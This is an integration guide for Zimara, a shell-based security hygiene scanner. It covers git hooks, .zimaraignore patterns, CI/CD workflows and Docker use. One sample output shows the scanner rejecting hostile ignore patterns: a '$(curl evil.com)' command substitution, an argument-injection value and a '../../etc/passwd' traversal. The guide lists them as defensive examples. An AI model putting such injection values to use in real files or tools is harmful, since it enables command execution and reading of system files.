**Zimara Integration Guide**  
**Version 0.48.0**  
**Published by Oob Skulden™**

This guide covers running Zimara as a Git hook, in CI/CD pipelines, and integrating it into your development workflow without making everyone on your team hate you.

**Related Documentation:**

- <README.md> - Overview and quick start
- <CHECKS.md> - Complete check reference with remediation steps

-----

## Table of Contents

- [Git Hooks Integration](#git-hooks-integration)
- [.zimaraignore Strategy](#zimaraignore-strategy)
- [CI/CD Integration](#cicd-integration)
- [Docker Containers](#docker-containers)
- [Team Adoption Strategies](#team-adoption-strategies)
- [When Zimara Isn’t Enough](#when-zimara-isnt-enough)

-----

## Git Hooks Integration

Git hooks are where Zimara does its best work. Run it before you commit or push, and you’ll catch problems while they’re still local and fixable without the postmortem.

### Pre-Commit Hook (Recommended)

Catches problems before they make it into your commit history.

**Setup:**

```bash
# From your repository root
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
./zimara.sh --non-interactive
exit $?
EOF

chmod +x .git/hooks/pre-commit
```

**What happens:**

- Zimara runs before every commit
- Critical/High findings block the commit immediately
- Medium/Low findings are allowed through (but visible)
- Exit code determines if commit proceeds
- Snippet output shows exact file:line locations

**Why pre-commit:**

- Fastest feedback loop
- Prevents bad commits from entering history
- Forces you to deal with issues when context is fresh
- No “I’ll fix it in the next commit” procrastination

### Pre-Push Hook (Alternative)

Runs later in the workflow, right before code leaves your machine.

**Setup:**

```bash
cat > .git/hooks/pre-push << 'EOF'
#!/bin/bash
./zimara.sh --non-interactive
exit $?
EOF

chmod +x .git/hooks/pre-push
```

**Why pre-push instead:**

- Less intrusive (doesn’t block every commit)
- Still catches issues before they hit the remote
- Good for teams that commit frequently and push rarely
- Allows local experimentation without constant blocking

**Trade-off:** Issues that make it into commit history are harder to fix later. You’ll need to amend commits or rewrite history.

### Interactive Mode in Hooks

If you want to be prompted about Medium/Low findings instead of automatic allow:

```bash
#!/bin/bash
./zimara.sh
exit $?
```

This gives you a choice on each finding. Useful when you’re still learning what Zimara considers risky.

**Warning:** Interactive mode in hooks can be annoying if you commit frequently. Use with caution.

### Making Hooks Easier to Share

The above approach requires every developer to set up hooks manually. That’s error-prone and people forget.

**Better approach: Committed hook script**

Create `scripts/setup-hooks.sh` in your repo:

```bash
#!/bin/bash
# Run this after cloning the repository

HOOK_DIR=".git/hooks"

echo "Setting up Zimara pre-commit hook..."

cat > "${HOOK_DIR}/pre-commit" << 'EOF'
#!/bin/bash
./zimara.sh --non-interactive
exit $?
EOF

chmod +x "${HOOK_DIR}/pre-commit"

echo "Git hooks installed. Zimara will run before each commit."
```

Make it executable:

```bash
chmod +x scripts/setup-hooks.sh
```

Add to your README:

```markdown
## Setup

After cloning:

1. Install dependencies: `npm install` (or whatever)
2. Set up Git hooks: `./scripts/setup-hooks.sh`
3. You're ready to commit
```

People still need to run it, but at least it’s documented and easy.

### Global Git Hooks (Advanced)

Want Zimara on every repository you work on? Use Git templates.

**Setup once, applies everywhere:**

```bash
# Create template directory
mkdir -p ~/.git-templates/hooks

# Create the hook
cat > ~/.git-templates/hooks/pre-commit << 'EOF'
#!/bin/bash
# Only run Zimara if it exists in the repo
if [ -f "./zimara.sh" ]; then
    ./zimara.sh --non-interactive
    exit $?
fi
exit 0
EOF

chmod +x ~/.git-templates/hooks/pre-commit

# Configure Git to use templates
git config --global init.templatedir ~/.git-templates
```

Now every new repository you create or clone gets the hook automatically.

**Caveat:** This only works for repos that have `zimara.sh` in them. Harmless otherwise.

### Using Hook Managers

If you already use a Git hook manager, add Zimara to your config:

**pre-commit framework:**

`.pre-commit-config.yaml`:

```yaml
repos:
  - repo: local
    hooks:
      - id: zimara
        name: Zimara Security Audit
        entry: ./zimara.sh --non-interactive
        language: script
        pass_filenames: false
        always_run: true
```

**Husky (Node.js projects):**

`.husky/pre-commit`:

```bash
#!/bin/sh
./zimara.sh --non-interactive
```

Hook managers are great if you already have them. Don’t install one just for Zimara unless you need other hooks too.

-----

## .zimaraignore Strategy

The `.zimaraignore` file lets you exclude files from scanning. Use it wisely.

### Setting Up .zimaraignore

Create `.zimaraignore` in your repository root:

```bash
# .zimaraignore - Zimara exclusion patterns
# Commit this file so patterns apply for everyone

# Third-party code (we don't control these)
vendor/*
node_modules/*
bower_components/*

# Test fixtures with intentional fake secrets
tests/fixtures/*
test/mock-data.js

# Build artifacts
dist/*
build/*
public/*
*.min.js
*.bundle.js

# Documentation examples
docs/api-examples/*
examples/*
```

### Pattern Best Practices

**DO:**

```
# Clear comments explaining why
vendor/*                    # Third-party OAuth SDK with test keys
tests/fixtures/*           # Intentional fake credentials for testing
dist/*                     # Generated bundles (scanned pre-build)
```

**DON’T:**

```
# No comment, unclear why
important-config.js

# Hiding real secrets (FIX THE ROOT CAUSE INSTEAD)
.env.production

# Excluding too much
*
src/*
```

### Common .zimaraignore Patterns

**For Hugo sites:**

```
# Hugo-specific
themes/*/exampleSite/*     # Theme demos with example keys
public/*                   # Build output (use --only-output to scan)
resources/_gen/*           # Generated resources
```

**For Jekyll sites:**

```
# Jekyll-specific
_site/*                    # Build output
vendor/bundle/*            # Bundled gems
.jekyll-cache/*            # Cache directory
```

**For Next.js:**

```
# Next.js-specific
.next/*                    # Build cache
out/*                      # Static export output
node_modules/*             # Dependencies
```

**For Astro:**

```
# Astro-specific
dist/*                     # Build output
node_modules/*             # Dependencies
.astro/*                   # Cache
```

### Security Warnings

Zimara validates patterns and warns about security issues:

```bash
$ zimara

Loading .zimaraignore
WARNING: .zimaraignore pattern exceeds 200 chars (truncated): very/long/path/...
WARNING: .zimaraignore invalid pattern (only a-z A-Z 0-9 . / - _ * allowed): $(curl evil.com)
WARNING: .zimaraignore pattern cannot start with '-' (argument injection): --exclude=secrets
WARNING: .zimaraignore path traversal not allowed (..): ../../etc/passwd
WARNING: Very broad pattern may disable important checks: *

Loaded 3 valid pattern(s) from .zimaraignore
```

Invalid patterns are rejected but don’t break the scan. Valid patterns still apply.

### When NOT to Use .zimaraignore

**Never use .zimaraignore to:**

- Hide real production secrets (rotate them and fix your patterns instead)
- Silence “annoying” warnings in production code (those are usually important)
- Exclude security-critical configuration files
- Work around fundamental security issues

**If you find yourself writing:**

```
# TODO: fix this later
src/admin/auth.js
```

You’re using `.zimaraignore` wrong. Fix the underlying issue.

### Team Adoption with .zimaraignore

**.zimaraignore helps onboarding:**

1. New developer clones repo
1. Runs `./scripts/setup-hooks.sh`
1. Makes first commit
1. Zimara runs with team’s exclusion patterns already applied
1. No “false positive” complaints about test fixtures

**Document your patterns:**

```
# .zimaraignore

# OAuth test SDK (intentional test credentials)
# See: https://github.com/oauth-sdk/oauth-sdk/issues/123
# Owner: @security-team
vendor/oauth-sdk/tests/*

# Legacy third-party widget (deprecated, removal tracked in JIRA-456)
# TODO: Remove when migration to new-widget completes
legacy/analytics-widget.js
```

This prevents:

- “Why is this excluded?” questions
- Pattern drift over time
- Exclusions that outlive their purpose

### .zimaraignore in CI

The patterns apply everywhere:

```yaml
# GitHub Actions example
- name: Run Zimara
  run: |
    chmod +x zimara.sh
    ./zimara.sh --non-interactive
    # .zimaraignore patterns automatically applied
```

No special CI configuration needed. The committed `.zimaraignore` file is respected.

### Auditing .zimaraignore

Periodically review your exclusion patterns:

```bash
# See what's being excluded
cat .zimaraignore

# Test scan without exclusions (see what you're missing)
mv .zimaraignore .zimaraignore.backup
zimara
mv .zimaraignore.backup .zimaraignore
```

Ask:

- Do we still need each pattern?
- Have any exclusions outlived their purpose?
- Are we hiding real problems?

Treat `.zimaraignore` like technical debt: necessary sometimes, but monitor it.

-----

## CI/CD Integration

Zimara runs fine in CI, but remember: it’s designed as a local-first tool. CI is your backup plan, not your primary defense.

### Why Run in CI at All?

- Not everyone runs hooks (hooks are opt-in, not enforced)
- Someone might bypass hooks with `--no-verify`
- CI provides audit trail and consistent enforcement
- Catches problems in pull requests from external contributors

### GitHub Actions

Basic workflow that runs Zimara on every push and pull request:

`.github/workflows/security-audit.yml`:

```yaml
name: Security Audit

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  zimara:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29  # v4.1.6
        with:
          fetch-depth: 0  # Full history for git-based checks
      
      - name: Make Zimara executable
        run: chmod +x zimara.sh
      
      - name: Run Zimara
        run: ./zimara.sh --non-interactive
```

**Important bits:**

- `fetch-depth: 0` ensures Zimara can scan git history (CHECK 17)
- `--non-interactive` means no prompts in CI
- Exit codes determine if workflow passes or fails
- `.zimaraignore` patterns automatically applied

### With Optional Dependencies

If you want gitleaks and npm audit checks:

```yaml
name: Security Audit

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  zimara:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
        with:
          fetch-depth: 0
      
      - name: Set up Node.js
        uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8  # v4.0.2
        with:
          node-version: '20'
        if: hashFiles('package.json') != ''
      
      - name: Install dependencies
        run: npm ci
        if: hashFiles('package.json') != ''
      
      - name: Install gitleaks
        run: |
          wget https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz
          tar -xzf gitleaks_8.18.0_linux_x64.tar.gz
          sudo mv gitleaks /usr/local/bin/
          gitleaks version
      
      - name: Run Zimara
        run: |
          chmod +x zimara.sh
          ./zimara.sh --non-interactive
```

This adds about 30 seconds to your CI runtime. Worth it if you want the extra checks.

### GitLab CI

`.gitlab-ci.yml`:

```yaml
zimara-audit:
  stage: test
  image: ubuntu:22.04
  
  before_script:
    - apt-get update && apt-get install -y git
  
  script:
    - chmod +x zimara.sh
    - ./zimara.sh --non-interactive
  
  only:
    - merge_requests
    - main
    - develop
```

### CircleCI

`.circleci/config.yml`:

```yaml
version: 2.1

jobs:
  zimara:
    docker:
      - image: cimg/base:2024.01
    steps:
      - checkout
      - run:
          name: Run Zimara Security Audit
          command: |
            chmod +x zimara.sh
            ./zimara.sh --non-interactive

workflows:
  version: 2
  security-check:
    jobs:
      - zimara
```

### Handling Exit Codes in CI

Zimara’s exit codes are deterministic by severity:

- **0**: Clean, workflow passes
- **1**: Medium/Low findings, workflow fails
- **2**: High findings, workflow fails
- **3**: Critical findings, workflow fails

If you want to allow Medium/Low findings but block High/Critical:

```yaml
- name: Run Zimara
  run: |
    ./zimara.sh --non-interactive
    EXIT_CODE=$?
    if [ $EXIT_CODE -eq 1 ]; then
      echo "Medium/Low findings present - allowing for now"
      exit 0
    fi
    exit $EXIT_CODE
```

This passes on exit code 1 but fails on 2 or 3.

**Use with caution.** Medium findings can become High findings when circumstances change. Better to fix them.

### CI Performance Tips

Zimara is fast, but CI runs add up. Some ways to keep it quick:

**1. Only scan on meaningful branches:**

```yaml
on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
```

Don’t run on every feature branch push if you have hundreds of developers.

**2. Use output-only mode for deploy checks:**

```yaml
# After build step
- name: Audit build output
  run: ./zimara.sh --only-output --non-interactive
```

This skips source scanning and only checks what’s about to deploy.

**3. Cache dependencies if using npm audit:**

```yaml
- name: Cache node modules
  uses: actions/cache@0c45773b623bea8c8e75f6c82b208c3cf94ea4f9  # v4.0.2
  with:
    path: ~/.npm
    key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
```

**4. Skip gitleaks on huge repos:**

Gitleaks scans entire git history. For massive repos, this can be slow. You can skip it in CI and rely on the built-in pattern checks instead.

### Snippet Output in CI Logs

With v0.48.0, CI logs now show code snippets with findings:

```
CHECK 04: Secrets Pattern Scan
------------------------------------------------------------
  Possible Secret
  File: src/config.js:42
  ────────────────────────────────────────
      40 | const config = {
      41 |   apiUrl: process.env.API_URL,
  >>  42 |   apiKey: "AKIA00000000EXAMPLE1234",
      43 |   timeout: 5000
      44 | };
  ────────────────────────────────────────
  Pattern: (AKIA[0-9A-Z]{16}|...)
  Action: Remove secret, rotate credentials
```

This makes CI failures much easier to debug — you can see exactly what triggered the finding without hunting through files.

**Adjust context for CI:**

```yaml
- name: Run Zimara with more context
  run: ./zimara.sh --non-interactive --snippet-context 5
```

More context = easier debugging, but longer logs.

**Hide patterns for cleaner reports:**

```yaml
- name: Run Zimara (clean output)
  run: ./zimara.sh --non-interactive --no-snippet-pattern
```

-----

## Docker Containers

Zimara runs in Docker containers with minimal setup. This is useful for isolated scanning, consistent environments, or when you can’t (or don’t want to) install Zimara locally.

### Why Run Zimara in Docker?

**Security isolation:**

- Scan untrusted third-party repos without risk
- Contain any potential exploits within the container
- Clean slate for every scan (no persistent state)

**Consistency:**

- Same environment across all developers
- Eliminates “works on my machine” issues
- Guaranteed compatible Bash/Unix tools versions

**Convenience:**

- No local installation required
- Works on Windows (via Docker Desktop)
- Easy CI/CD integration without custom runners

### Quick Scan (One-Off)

Scan the current directory in an ephemeral container:

```bash
docker run --rm -v $(pwd):/repo -w /repo ubuntu:22.04 bash -c "
  apt-get update -qq && apt-get install -y -qq git curl
  curl -sO https://raw.githubusercontent.com/[your-username]/zimara/main/zimara.sh
  chmod +x zimara.sh
  ./zimara.sh --non-interactive
"
```

**What this does:**

- Creates a throwaway Ubuntu container (`--rm` removes it after)
- Mounts current directory as `/repo` inside container
- Installs git (only missing dependency)
- Downloads and runs Zimara
- Container destroyed when scan completes

**Runtime:** ~30 seconds first run (downloads + apt-get), ~5 seconds on subsequent runs (image cached).

### Dockerfile for Repeated Use

If you’re scanning repos regularly, build a reusable image:

**Create `Dockerfile`:**

```dockerfile
FROM ubuntu:22.04

# Install dependencies
RUN apt-get update && \
    apt-get install -y git curl && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Download Zimara
RUN curl -o /usr/local/bin/zimara \
    https://raw.githubusercontent.com/[your-username]/zimara/main/zimara.sh && \
    chmod +x /usr/local/bin/zimara

WORKDIR /repo

ENTRYPOINT ["zimara"]
CMD ["--non-interactive"]
```

**Build the image:**

```bash
docker build -t zimara:latest .
```

**Use it:**

```bash
# Scan current directory
docker run --rm -v $(pwd):/repo zimara:latest

# Scan with custom options
docker run --rm -v $(pwd):/repo zimara:latest --verbose

# Scan output directory only
docker run --rm -v $(pwd):/repo zimara:latest --only-output
```

### Alpine Linux (Smaller Image)

For a minimal image (~5MB vs Ubuntu’s ~80MB):

```dockerfile
FROM alpine:3.18

# Install dependencies (Alpine uses apk, not apt-get)
RUN apk add --no-cache bash git grep findutils sed gawk

# Download Zimara
RUN wget -O /usr/local/bin/zimara \
    https://raw.githubusercontent.com/[your-username]/zimara/main/zimara.sh && \
    chmod +x /usr/local/bin/zimara

WORKDIR /repo

ENTRYPOINT ["zimara"]
CMD ["--non-interactive"]
```

**Build and use:**

```bash
docker build -t zimara:alpine .
docker run --rm -v $(pwd):/repo zimara:alpine
```

**Trade-off:** Alpine uses musl libc instead of glibc. Zimara works fine, but some optional tools (gitleaks, npm) may need different installation methods.

### Windows Support (via Docker Desktop)

Zimara doesn’t run natively on Windows, but works perfectly in Docker Desktop:

**Prerequisites:**

1. Install [Docker Desktop for Windows](https://www.docker.com/products/docker-desktop)
1. Enable WSL 2 backend (recommended, faster than Hyper-V)

**Usage (PowerShell or CMD):**

```powershell
# Scan current directory
docker run --rm -v ${PWD}:/repo -w /repo ubuntu:22.04 bash -c "apt-get update -qq && apt-get install -y -qq git curl && curl -sO https://raw.githubusercontent.com/[your-username]/zimara/main/zimara.sh && chmod +x zimara.sh && ./zimara.sh --non-interactive"

# Or use a pre-built image
docker run --rm -v ${PWD}:/repo zimara:latest
```

**Note for Windows users:** If you have WSL 2 installed, you can also run Zimara directly in WSL 2 without Docker (see [Platform Support](#platform-support) below).

### CI/CD with Docker

Docker makes CI/CD integration trivial - no need to install dependencies:

**GitHub Actions:**

```yaml
name: Security Audit

on: [push, pull_request]

jobs:
  zimara:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      
      - name: Run Zimara in Docker
        run: |
          docker run --rm -v ${{ github.workspace }}:/repo -w /repo \
            ubuntu:22.04 bash -c "
              apt-get update -qq && apt-get install -y -qq git curl
              curl -sO https://raw.githubusercontent.com/[you]/zimara/main/zimara.sh
              chmod +x zimara.sh
              ./zimara.sh --non-interactive
            "
```

**GitLab CI:**

```yaml
zimara-docker:
  stage: test
  image: docker:latest
  services:
    - docker:dind
  script:
    - docker run --rm -v $(pwd):/repo -w /repo ubuntu:22.04 bash -c "
        apt-get update -qq && apt-get install -y -qq git curl &&
        curl -sO https://raw.githubusercontent.com/[you]/zimara/main/zimara.sh &&
        chmod +x zimara.sh &&
        ./zimara.sh --non-interactive
      "
```

**CircleCI:**

```yaml
version: 2.1

jobs:
  zimara:
    docker:
      - image: cimg/base:current
    steps:
      - checkout
      - setup_remote_docker
      - run:
          name: Zimara Security Scan
          command: |
            docker run --rm -v $(pwd):/repo -w /repo ubuntu:22.04 bash -c "
              apt-get update -qq && apt-get install -y -qq git curl
              curl -sO https://raw.githubusercontent.com/[you]/zimara/main/zimara.sh
              chmod +x zimara.sh
              ./zimara.sh --non-interactive
            "
```

### Docker with Optional Dependencies

To include gitleaks and npm audit in your container:

```dockerfile
FROM ubuntu:22.04

# Install all dependencies
RUN apt-get update && \
    apt-get install -y git curl wget && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Install Node.js (for npm audit)
RUN curl -fsSL https://deb.nodesource.com/setup_20.x | bash - && \
    apt-get install -y nodejs

# Install gitleaks
RUN wget https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz && \
    tar -xzf gitleaks_8.18.0_linux_x64.tar.gz && \
    mv gitleaks /usr/local/bin/ && \
    rm gitleaks_8.18.0_linux_x64.tar.gz

# Download Zimara
RUN curl -o /usr/local/bin/zimara \
    https://raw.githubusercontent.com/[your-username]/zimara/main/zimara.sh && \
    chmod +x /usr/local/bin/zimara

WORKDIR /repo

ENTRYPOINT ["zimara"]
CMD ["--non-interactive"]
```

This gives you CHECK 12 (gitleaks) and CHECK 14 (npm audit) in addition to Zimara’s built-in checks.

### Platform Support

Zimara works on multiple platforms:

**Native support:**

- ✅ Linux (all major distributions - Ubuntu, Debian, Fedora, Arch, etc.)
- ✅ macOS (Intel and Apple Silicon)
- ✅ Windows WSL 2 (Windows Subsystem for Linux)

**Via Docker:**

- ✅ Windows (Docker Desktop with WSL 2 backend)
- ✅ Any platform with Docker installed

**NOT supported:**

- ❌ Native Windows (PowerShell/CMD) - use WSL 2 or Docker instead
- ❌ Windows WSL 1 (lacks full bash compatibility) - upgrade to WSL 2

**Windows users:** We recommend WSL 2 over Docker Desktop if you plan to run Zimara frequently. It’s faster and uses fewer resources. See [Running in WSL 2](#running-in-wsl-2).

### Running in WSL 2

If you’re on Windows and have WSL 2 installed, you can run Zimara natively without Docker:

**Setup (one-time):**

```bash
# Inside WSL 2 terminal
sudo apt update
sudo apt install git curl

# Download Zimara
curl -o ~/zimara.sh https://raw.githubusercontent.com/[your-username]/zimara/main/zimara.sh
chmod +x ~/zimara.sh

# Optional: add to PATH
sudo mv ~/zimara.sh /usr/local/bin/zimara
```

**Usage:**

```bash
# Navigate to your Windows repo (accessible via /mnt/c/...)
cd /mnt/c/Users/YourName/projects/my-repo

# Run Zimara
zimara --non-interactive
```

**Performance note:** WSL 2 is significantly faster than Docker Desktop for frequent scans because there’s no container overhead.

### Docker Troubleshooting

**“Cannot connect to Docker daemon”**

- Ensure Docker Desktop is running (Windows/Mac)
- On Linux, start Docker: `sudo systemctl start docker`

**“Permission denied” on volume mount**

- Windows: Ensure drive sharing is enabled in Docker Desktop settings
- Linux: Add your user to docker group: `sudo usermod -aG docker $USER` (logout/login required)

**Slow performance on Windows**

- Use WSL 2 backend (faster than Hyper-V)
- Run from WSL 2 terminal instead of PowerShell for better file I/O
- Consider native WSL 2 installation instead of Docker

**Container can’t access .git directory**

- Ensure you’re mounting the repo root, not a subdirectory
- Check that `.git` isn’t in `.dockerignore`

### When to Use Docker vs Native

**Use Docker when:**

- Scanning untrusted third-party repositories (isolation)
- Working on Windows without WSL 2
- Need identical environment across team
- Running in CI/CD without custom runners
- Want zero local installation

**Use native installation when:**

- Daily development on your own code
- Running frequent local scans (faster)
- Using WSL 2 on Windows (better performance)
- Need integration with local git hooks

**See also:**

- [SECURITY.md](SECURITY.md#running-on-untrusted-repositories) - Container isolation for untrusted repos
- [Git Hooks Integration](#git-hooks-integration) - Native pre-commit setup

-----

Getting a team to use a new security tool is like getting them to floss. Everyone knows they should, nobody wants to start.

### The Soft Launch

**Week 1: Observational**

Run Zimara in CI in “warning-only” mode:

```yaml
- name: Run Zimara (informational)
  run: ./zimara.sh --non-interactive || true
  continue-on-error: true
```

This shows findings without blocking. Review them in team meetings. Build awareness.

**Week 2-3: Team discussion**

Review common findings with the team:

- “We have 47 backup files committed, let’s clean those up”
- “Three repos have AWS keys in git history, we need to rotate those”
- “Anyone know why we have phpinfo.php in production output?”

Fix the obvious stuff. Get buy-in.

**Create initial .zimaraignore:**

```
# Agreed exclusions (2025-01-15 team meeting)
vendor/*              # Third-party code
tests/fixtures/*      # Intentional test data
```

This shows you’re listening and solving friction points.

**Week 4: Enforcement**

Remove `continue-on-error`. Now it blocks on findings.

By this point, most common issues are fixed and people understand why Zimara exists.

### The Documentation Approach

Add a “Security” section to your contributing guidelines:

```markdown
## Security Checks

This repository uses Zimara to catch common security issues before code is pushed.

After cloning, set up the pre-commit hook:

./scripts/setup-hooks.sh

This will run automatically before each commit. If Zimara finds issues:

- **Critical/High**: Fix before committing
- **Medium/Low**: Use judgment, but prefer fixing over bypassing

To run manually:

./zimara.sh

To bypass (when you absolutely must):

git commit --no-verify

Please don't bypass unless you have a good reason and plan to fix the issue soon.

### Excluding Files

If you need to exclude test fixtures or third-party code, add patterns to `.zimaraignore`:

# .zimaraignore
tests/fixtures/*    # Intentional fake secrets for testing

Document why you're excluding files in comments.
```

Make it part of onboarding. New people set up hooks on day one.

### The Incentive Approach

Some teams track security metrics:

- Fewest Zimara findings per developer this month
- Fastest time from clone to first clean commit
- Most creative excuse for bypassing hooks

Make it visible. Make it slightly competitive. Humans are weird about leaderboards.

### The “Lead by Example” Approach

Senior developers use Zimara consistently. They fix findings in their PRs before requesting review. They mention it in code reviews when they catch issues Zimara would have flagged.

Culture change happens top-down. If leadership doesn’t care about security tooling, nobody else will either.

### Dealing with Resistance

**“It’s too slow”**

Zimara runs in under 5 seconds for most repos. If it’s slow, they’re probably committing 50MB of node_modules. That’s a different problem.

**“It has false positives”**

Show them the snippet. Explain why it’s flagged. Most “false positives” are real issues that don’t feel important until they become important very suddenly.

For legitimate false positives (test fixtures with fake secrets), add to `.zimaraignore` with a comment explaining why.

**“I know what I’m doing”**

Great. Then fixing the findings should be trivial for someone of your expertise.

**“I’ll fix it later”**

Later never comes. Fix it now while context is fresh.

**“CI will catch it”**

CI catches it after you push. Hooks catch it before. Prevention beats cleanup.

### The Nuclear Option

If your team absolutely refuses to use hooks, lock down the main branch:

- Require CI passing before merge
- Require code review from someone who will enforce standards
- Make bypass attempts visible in Slack/Teams

This is less pleasant than voluntary adoption, but sometimes you need enforcement.

### Using .zimaraignore to Reduce Friction

One common adoption blocker: “Zimara keeps flagging our test fixtures!”

Solution:

```bash
# .zimaraignore
tests/fixtures/mock-oauth-response.json    # Contains fake API keys for testing
tests/data/example-credentials.yml         # Test data, not real secrets
```

Now developers don’t feel like they’re fighting the tool.

**Document the pattern:**

```markdown
## Adding Test Fixtures

If you add test files with intentional fake secrets:

1. Use obviously fake values:
   - `AKIA00000000EXAMPLE1234` not `AKIAIOSFODNN7EXAMPLE`
   - `sk_test_fake_not_real_key` not something that looks real

2. Add to .zimaraignore with a comment:
   # Test fixture for OAuth flow (fake credentials)
   tests/fixtures/oauth-mock.json

3. Commit both the fixture and .zimaraignore update together
```

This creates a pattern that’s easy to follow and document.

-----

## When Zimara Isn’t Enough

Zimara is a flashlight. Sometimes you need floodlights.

### You Need Actual SAST if:

- Your codebase is complex (10,000+ lines of non-trivial logic)
- You’re building a web app with authentication
- Compliance requires it (PCI-DSS, SOC 2, etc.)
- You’re handling sensitive data (PII, financial, health)

**Tools to consider:**

- Semgrep (open source, good for custom rules)
- CodeQL (GitHub’s offering, deep semantic analysis)
- Snyk Code (fast, developer-friendly)
- SonarQube (comprehensive, enterprise-focused)

### You Need Secret Scanning if:

- You’re a team of more than 5 developers
- You’ve had secret leaks in the past
- You’re handling production infrastructure

**Tools to consider:**

- GitHub Secret Scanning (free for public repos, built-in)
- GitGuardian (commercial, very comprehensive)
- gitleaks (open source, CLI tool)
- TruffleHog (open source, git history analysis)

### You Need Dependency Scanning if:

- You use more than a dozen dependencies
- You deploy to production regularly
- You’re running a service, not a static site

**Tools to consider:**

- Dependabot (free, GitHub native)
- Snyk Open Source (good coverage, free tier available)
- OWASP Dependency-Check (free, thorough)
- WhiteSource Renovate (automated updates)

### You Need Container Scanning if:

- You’re deploying with Docker
- You use third-party base images
- You care about OS-level vulnerabilities

**Tools to consider:**

- Trivy (fast, accurate, free)
- Grype (Anchore’s offering, good for CI)
- Docker Scout (Docker’s native solution)
- Snyk Container (commercial but comprehensive)

### You Need Runtime Protection if:

- Your application processes untrusted input
- You’re exposed to the internet
- Downtime costs real money

**Tools to consider:**

- WAF (Web Application Firewall)
- Runtime Application Self-Protection (RASP)
- Intrusion Detection Systems (IDS)
- Security Information and Event Management (SIEM)

### The Integration Stack

For a production service, a realistic security stack might be:

**Local (pre-commit):**

- Zimara (quick hygiene checks with snippet-enhanced findings)
- Linter (code quality)
- Unit tests (functionality)

**CI (pre-merge):**

- SAST (CodeQL, Semgrep)
- Secret scanning (gitleaks, GitGuardian)
- Dependency scanning (Snyk, Dependabot)
- Container scanning (Trivy)
- Integration tests

**Production:**

- WAF (Cloudflare, AWS WAF)
- Runtime monitoring (Datadog, Sentry)
- Log analysis (ELK, Splunk)
- Incident response (PagerDuty)

Zimara fits in the “local” layer. It’s your first line of defense, not your only line.

### When to Graduate Beyond Zimara

Signs you’ve outgrown what Zimara can do:

- You’re building an application, not a static site
- Security findings require human analysis
- Compliance audits need formal tooling documentation
- You have a dedicated security team
- Your threat model includes sophisticated attackers

At that point, Zimara becomes one tool in a larger toolbox. Keep using it for local checks, but supplement with heavier tooling for deeper analysis.

-----

-----

## Final Thoughts on Integration

The best security tool is the one that actually runs.

Zimara is simple on purpose. It doesn’t require accounts, APIs, or approval from procurement. You can add it to a project in under a minute and it starts providing value immediately.

The v0.48.0 snippet enhancements make findings easier to understand and fix. The `.zimaraignore` security hardening means you can exclude files without creating new attack surfaces.

For many projects, that’s enough. For larger projects, it’s a foundation.

Either way, run it early and run it often. Most security problems are boring mistakes that could have been caught with grep and a little paranoia.

Zimara is grep with paranoia built in.

Use it.

-----

**Need check details?**  
See <CHECKS.md> for what each finding means and how to fix it.

**Want the big picture?**  
Head back to <README.md> for overview and philosophy.

**Published by Oob Skulden™**  
The threats you don’t see coming.